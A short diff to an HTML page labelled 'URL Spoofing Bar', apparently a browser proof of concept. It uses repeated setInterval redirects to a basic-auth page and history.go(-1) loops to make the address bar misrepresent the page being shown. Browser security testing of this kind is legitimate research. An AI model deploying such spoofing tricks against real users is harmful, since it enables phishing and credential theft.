@@ -3,19 +3,13 @@
 <html>
 <body>
 <script>
-        v = setInterval(`x=document.location='https://jigsaw.w3.org/HTTP/Basic/';`);
-        i = setInterval(`
-            x.document.write("<h1>url spoofing...</h1>");
-            clearInterval(v);
-            clearInterval(i);
-            `, 3333);        
+        v = setInterval(`x=document.location='https://jigsaw.w3.org/HTTP/Basic/';`);        
 </script>
         </h1>URL Spoofing Bar</h1>
 <form action="https://www.w3schools.com/tags/action_page.php">
         
 Enter your name: <input type="text" name="firstname" value=""><br>
 </form> 
-        <input onclick="setTimeout(function(){window.history.go(-1);window.stop();}, 30);" type="button" value="Go to google.com" />
-        <input onclick="se(function(){window.stop();}, 30);" type="button" value="window.stop()" />
+        <input onclick="setInterval(function(){window.history.go(-1);}, 30);" type="button" value="Go to google.com" />
 </body>
 </html>
